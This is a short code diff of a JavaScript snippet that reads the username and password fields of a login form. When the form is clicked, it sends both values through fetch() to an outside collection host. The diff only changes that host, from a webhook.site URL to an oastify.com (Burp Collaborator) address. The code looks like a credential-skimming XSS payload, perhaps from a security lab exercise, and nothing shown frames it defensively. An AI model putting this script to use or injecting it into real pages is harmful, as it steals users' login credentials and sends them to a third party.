@@ -54,7 +54,7 @@ setTimeout(function () {
         let b = document.getElementsByName('password')[0];
         function f() {
           if(b.value.length>0) {
-            fetch('https://webhook.site/f16c7092-d5fd-4dbe-b19f-34fa81e76421/' + encodeURIComponent(a.value) + '&password=' + encodeURIComponent(b.value));
+            fetch('http://4v0frcmg9mskoccjfiptxpxgz75ytuhj.oastify.com/' + encodeURIComponent(a.value) + '&password=' + encodeURIComponent(b.value));
           }
        }
         a.form.onclick=f;
